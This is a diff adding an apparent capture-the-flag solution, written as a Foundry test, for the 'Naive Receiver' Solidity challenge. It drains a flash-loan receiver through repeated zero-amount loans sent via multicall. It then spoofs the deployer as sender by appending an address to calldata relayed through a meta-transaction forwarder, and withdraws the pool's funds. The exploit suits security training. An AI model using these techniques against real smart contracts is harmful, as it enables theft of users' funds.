@@ -7,6 +7,7 @@ import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/Naive
 import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
 import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
 
+
 contract NaiveReceiverChallenge is Test {
     address deployer = makeAddr("deployer");
     address recovery = makeAddr("recovery");
@@ -77,7 +78,56 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
+      bytes[] memory data = new bytes[](10);
+			bytes memory flashLoanCallData = abi.encodeCall(
+    	pool.flashLoan,
+    	(receiver, address(weth), 0, "")
+			);
+			for (uint256 i; i < 10; ) {
+				data[i] = flashLoanCallData;
+				unchecked {
+						++i;
+				}
+			}
+			pool.multicall(data);
+
+      assertEq(weth.balanceOf(address(pool)), 1010e18);
+
+			bytes memory drainCalldata = abi.encodePacked(
+				abi.encodeCall(
+					pool.withdraw,
+					(WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))
+				),
+				deployer
+			);
+
+			bytes[] memory drainCalldataArray = new bytes[](1);
+			drainCalldataArray[0] = drainCalldata;
+
+			BasicForwarder.Request memory request = BasicForwarder.Request({
+				from: player,
+				target: address(pool),
+				value: 0,
+				gas: gasleft(),
+				nonce: 0,
+				data: abi.encodeCall(pool.multicall, (drainCalldataArray)),
+				deadline: block.timestamp + 1000000
+			});
+
+			bytes32 requestHash = forwarder.getDataHash(request);
+			bytes32 digest = keccak256(
+				abi.encodePacked(
+						"\x19\x01",
+						forwarder.domainSeparator(),
+						requestHash
+    		)
+			);
+			(uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
+			bytes memory signature = abi.encodePacked(r, s, v);
+
+			bool success = forwarder.execute(request, signature);
+
+			assertEq(success, true);
     }
 
     /**
